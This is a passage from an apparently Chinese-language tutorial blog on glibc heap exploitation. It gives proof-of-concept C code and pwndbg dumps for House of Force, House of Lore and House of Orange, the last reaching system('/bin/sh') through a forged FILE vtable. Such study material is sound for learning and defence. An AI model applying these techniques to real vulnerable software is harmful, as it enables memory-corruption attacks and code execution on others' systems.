class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000111</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000x0000000000020c61 &lt;==== top chunk</span><br></pre></td></tr></table></figure><h4 id="2-溢出修改top-chunk-size"><a href="#2-溢出修改top-chunk-size" class="headerlink" title="2 溢出修改top chunk size"></a>2 溢出修改top chunk size</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559290</span><br><span class="line">0x555555559290:0x00000000000000000x0000000000000111</span><br><span class="line">0x5555555592a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555592b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559390:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555593a0:0x00000000000000000xffffffffffffffff &lt;==== 修改top chunk size为极大值</span><br><span class="line">0x5555555593b0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="抬高malloc到目标buffer"><a href="#抬高malloc到目标buffer" class="headerlink" title="抬高malloc到目标buffer"></a>抬高malloc到目标buffer</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line"><span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc 0xffffffffffffeef0 bytes.</span><br></pre></td></tr></table></figure><h4 id="malloc并strcpy覆写"><a href="#malloc并strcpy覆写" class="headerlink" title="malloc并strcpy覆写"></a>malloc并strcpy覆写</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">... old string: 这里是将要被覆写的字符串.</span><br><span class="line">... 使用 strcpy 覆写 &quot;YEAH!!!&quot;...</span><br><span class="line">... new string: YEAH!!!</span><br></pre></td></tr></table></figure><h3 id="Glibc-2-27-1"><a href="#Glibc-2-27-1" class="headerlink" title="Glibc 2.27"></a>Glibc 2.27</h3><p>目前在glibc2.27上仍然可以利用，而2.29版本则已有缓解措施</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br></pre></td></tr></table></figure><h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>创建两个chunk，第一个用于进入smallbin中，第二个用来防止free后被top chunk合并，free第一块，将其送入unsortedbin链表，再次申请一个size位于largebin中，并且在unsortedbin中没有与其匹配的chunk，系统接下来会把unsortedbin中的chunk加入到smallbin中。假设可以控制 第一个chunk的fd、bk指针，我们就可以在栈上伪造出一个smallbin的链表，再次malloc时，就可以从smallbin的链表末尾取chunk了。这样就可以在栈上创造chunk。</p><h3 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> &#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> prev_size;</span><br><span class="line">  <span class="keyword">size_t</span> size;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x64</span>];               <span class="comment">// 填充 smallbin size大小的chunk</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> <span class="title">fake_chunk</span>, <span class="title">another_fake_chunk</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">small_chunk</span> *<span class="title">real_chunk</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *ptr, *victim;</span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"House of lore Poc\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fake_chunk地址:  %p\n\n"</span>, &amp;fake_chunk);</span><br><span class="line">  len = <span class="keyword">sizeof</span>(struct small_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"申请两个small chunk，释放第一个，该块会并入unsorted bin\n"</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第一块small chunk地址:  %p\n\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第二块大小可以为任意值，只是为了防止第一块free后与top chunk合并\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第二块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">  real_chunk = (struct small_chunk *)(ptr - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第一块目前的地址:  %p\n\n"</span>, real_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"再申请一个chunk，size大于之前chunk以防被分配到同一个位置\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"之前free的chunk现在进入small bin\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"第三块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len + <span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"使第一块small chunk的bk指针指向&amp;fake_chunk,fake chunk将被插入smallbin\n"</span>);</span><br><span class="line">  real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"使fake_chunk的fd指针指向第一块small chunk\n"</span>);</span><br><span class="line">  fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"绕过 \'victim-&gt;bk-&gt;fd == victim\' 检测\n"</span>);</span><br><span class="line">  fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">  another_fake_chunk.fd = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"重新申请第一块,地址为:  %p\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line"></span><br><span class="line">  victim = <span class="built_in">malloc</span>(len);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"再次申请得到fake_chunk,地址为  %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/28/ZCwxyNanpq6FdLM.png" alt="image.png"></p><h3 id="分步分析-2"><a href="#分步分析-2" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请两个small-chunk"><a href="#1-申请两个small-chunk" class="headerlink" title="1 申请两个small chunk"></a>1 申请两个small chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ptr = <span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第一块small chunk地址:  %p\n\n"</span>, ptr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第二块大小可以为任意值，只是为了防止第一块free后与top chunk合并\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"第二块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091 &lt;=== chunk1</span><br><span class="line">0x555555559420:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559440:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559450:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559460:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559470:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559480:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000000x0000000000000091 &lt;=== chunk2</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559500:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559510:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x0000000000020ad1 &lt;=== top chunk</span><br></pre></td></tr></table></figure><h4 id="2-释放chunk1"><a href="#2-释放chunk1" class="headerlink" title="2 释放chunk1"></a>2 释放chunk1</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4b380x00007ffff7fc4b38 &lt;=== 加入unsorted bin</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559440:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559450:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559460:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559470:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559480:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x0000000000020ad1  =================&gt;|</span><br><span class="line">                                                                          |</span><br><span class="line">pwndbg&gt; x/20xg 0x00007ffff7fc4b38                                         |</span><br><span class="line">0x7ffff7fc4b38 &lt;main_arena+88&gt;:0x00005555555595300x0000000000000000  &lt;=|</span><br><span class="line">0x7ffff7fc4b48 &lt;main_arena+104&gt;:0x00005555555594100x0000555555559410 &lt;=== chunk1</span><br><span class="line">0x7ffff7fc4b58 &lt;main_arena+120&gt;:0x00007ffff7fc4b480x00007ffff7fc4b48</span><br><span class="line">0x7ffff7fc4b68 &lt;main_arena+136&gt;:0x00007ffff7fc4b580x00007ffff7fc4b58</span><br><span class="line">0x7ffff7fc4b78 &lt;main_arena+152&gt;:0x00007ffff7fc4b680x00007ffff7fc4b68</span><br><span class="line">0x7ffff7fc4b88 &lt;main_arena+168&gt;:0x00007ffff7fc4b780x00007ffff7fc4b78</span><br><span class="line">0x7ffff7fc4b98 &lt;main_arena+184&gt;:0x00007ffff7fc4b880x00007ffff7fc4b88</span><br><span class="line">0x7ffff7fc4ba8 &lt;main_arena+200&gt;:0x00007ffff7fc4b980x00007ffff7fc4b98</span><br><span class="line">0x7ffff7fc4bb8 &lt;main_arena+216&gt;:0x00007ffff7fc4ba80x00007ffff7fc4ba8</span><br><span class="line">0x7ffff7fc4bc8 &lt;main_arena+232&gt;:0x00007ffff7fc4bb80x00007ffff7fc4bb8</span><br></pre></td></tr></table></figure><h4 id="3-申请chunk3"><a href="#3-申请chunk3" class="headerlink" title="3 申请chunk3"></a>3 申请chunk3</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"第三块small chunk地址:  %p\n\n"</span>, <span class="built_in">malloc</span>(len + <span class="number">0x10</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4bb80x00007ffff7fc4bb8 &lt;=== chunk1加入small bin</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">                        ...</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                        ...</span><br><span class="line">0x555555559530:0x00000000000000000x00000000000000a1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg 0x00007ffff7fc4bb8</span><br><span class="line">0x7ffff7fc4bb8 &lt;main_arena+216&gt;:0x00007ffff7fc4ba80x00007ffff7fc4ba8</span><br><span class="line">0x7ffff7fc4bc8 &lt;main_arena+232&gt;:0x00005555555594100x0000555555559410 &lt;=== chunk1</span><br><span class="line">0x7ffff7fc4bd8 &lt;main_arena+248&gt;:0x00007ffff7fc4bc80x00007ffff7fc4bc8</span><br><span class="line">0x7ffff7fc4be8 &lt;main_arena+264&gt;:0x00007ffff7fc4bd80x00007ffff7fc4bd8</span><br><span class="line">0x7ffff7fc4bf8 &lt;main_arena+280&gt;:0x00007ffff7fc4be80x00007ffff7fc4be8</span><br><span class="line">0x7ffff7fc4c08 &lt;main_arena+296&gt;:0x00007ffff7fc4bf80x00007ffff7fc4bf8</span><br><span class="line">0x7ffff7fc4c18 &lt;main_arena+312&gt;:0x00007ffff7fc4c080x00007ffff7fc4c08</span><br><span class="line">0x7ffff7fc4c28 &lt;main_arena+328&gt;:0x00007ffff7fc4c180x00007ffff7fc4c18</span><br><span class="line">0x7ffff7fc4c38 &lt;main_arena+344&gt;:0x00007ffff7fc4c280x00007ffff7fc4c28</span><br><span class="line">0x7ffff7fc4c48 &lt;main_arena+360&gt;:0x00007ffff7fc4c380x00007ffff7fc4c38</span><br></pre></td></tr></table></figure><h4 id="4-修改bk-fd指针，绕过检测"><a href="#4-修改bk-fd指针，绕过检测" class="headerlink" title="4 修改bk fd指针，绕过检测"></a>4 修改bk fd指针，绕过检测</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"使第一块small chunk的bk指针指向&amp;fake_chunk,fake chunk将被插入smallbin\n"</span>);</span><br><span class="line">real_chunk-&gt;bk = &amp;fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"使fake_chunk的fd指针指向第一块small chunk\n"</span>);</span><br><span class="line">fake_chunk.fd = real_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"绕过 \'victim-&gt;bk-&gt;fd == victim\' 检测\n"</span>);</span><br><span class="line">fake_chunk.bk = &amp;another_fake_chunk;</span><br><span class="line">another_fake_chunk.fd = &amp;fake_chunk;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/40xg 0x555555559420 -0x20</span><br><span class="line">0x555555559400:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559410:0x00000000000000000x0000000000000091</span><br><span class="line">0x555555559420:0x00007ffff7fc4bb80x00007fffffffda70 &lt;=== fd-&gt;smallbin  bk-&gt;&amp;fake_chunk</span><br><span class="line">0x555555559430:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559490:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555555594a0:0x00000000000000900x0000000000000090</span><br><span class="line">0x5555555594b0:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x555555559520:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559530:0x00000000000000000x00000000000000a1</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg 0x00007fffffffda70</span><br><span class="line">0x7fffffffda70:0x00000380000003800x0000038000000380 &lt;=== fake_chunk</span><br><span class="line">0x7fffffffda80:0x00005555555594100x00007fffffffdb00 &lt;=== fd-&gt;chunk1  bk-&gt;&amp;another_fake_chunk</span><br><span class="line">0x7fffffffda90:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdaa0:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdab0:0x00000380000003800x0000038000000380</span><br><span class="line">0x7fffffffdac0:0x00000000000000000x0000004000000100</span><br><span class="line">0x7fffffffdad0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdae0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdaf0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdb00:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="5-malloc两次，成功将fake-chunk加入"><a href="#5-malloc两次，成功将fake-chunk加入" class="headerlink" title="5 malloc两次，成功将fake_chunk加入"></a>5 malloc两次，成功将fake_chunk加入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"重新申请第一块,地址为:  %p\n"</span>, <span class="built_in">malloc</span>(len));</span><br><span class="line"></span><br><span class="line">victim = <span class="built_in">malloc</span>(len);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/28/qKBpro1tkzEw2Ma.png" alt="image.png"></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过house of lore，我们达到了任意地址分配内存的效果，就可以向chunk中写入数据来覆盖返回地址控制eip，甚至绕过 canary检查。</p><h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>假设存在堆溢出可覆盖到 top chunk，设置top chunk+size页面对齐，设置prev_inuse位，然后申请一块比top chunk size大的块，使top chunk扩展。控制io_list_all，当malloc分割时，chunk-&gt;bk-&gt;fd的值会被libc的main_arena中的unsorted bin列表的地址覆盖。修改fd满足相应条件，设置跳板指针指向可控内存，malloc触发利用链。</p><h3 id="Poc-3"><a href="#Poc-3" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"House of orange Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line"></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"首先申请一个chunk: p1 %p \n"</span>,p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置top chunk+size页面对齐，设置prev_inuse位\n\n"</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"申请一个size大于top chunk的块，使其调用sysmalloc和_init_free\n\n"</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"p2 %p \n"</span>, p2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"chunk-&gt;bk-&gt;fd覆盖_IO_list_all指针\n\n"</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"io_list_all现在指向chunk-&gt;bk-&gt;fd  %p \n"</span>, &amp;io_list_all);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"当malloc分割时，chunk-&gt;bk-&gt;fd的值会被libc的main_arena中的unsorted bin列表的地址覆盖。\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置chunk-&gt;bk为_IO_list_all - 16\n"</span>);</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"system将通过top指针被调用，使用用/bin/sh填充前8个字节，相当于system(/bin/sh)\n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"将top chunk的size改小，使旧的top chunk被malloc分配到small bin[4]，指向伪文件指针的fd-ptr\n\n"</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n"</span>);</span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足 fp-&gt;_mode &lt;= 0\n"</span> );</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"满足 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n"</span>);</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置跳板指向可控内存\n\n"</span>);</span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// 可控内存</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"malloc触发利用链\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/28/SwRgapBuTN7ZACW.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/01/28/UN84qTwetEmMzyf.png" alt="image.png"></p><h3 id="分步分析-3"><a href="#分步分析-3" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-申请chunk1，修改top-chunk"><a href="#1-申请chunk1，修改top-chunk" class="headerlink" title="1 申请chunk1，修改top chunk"></a>1 申请chunk1，修改top chunk</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"设置top chunk+size页面对齐，设置prev_inuse位\n\n"</span>);</span><br><span class="line">top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1025, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603400 PREV_INUSE &#123;    &lt;====== chunk1</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 3073, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x604000 &#123;               &lt;====== top chunk</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 0, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/40xg 0x603400-0x400</span><br><span class="line">0x603000:0x00000000000000000x0000000000000401 &lt;===== chunk1</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000000</span><br><span class="line">                   ...</span><br><span class="line">0x6033f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603400:0x00000000000000000x0000000000000c01 &lt;===== top chunk</span><br><span class="line">0x603410:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h4 id="2-申请一个size大于top-chunk的块"><a href="#2-申请一个size大于top-chunk的块" class="headerlink" title="2 申请一个size大于top chunk的块"></a>2 申请一个size大于top chunk的块</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2 = <span 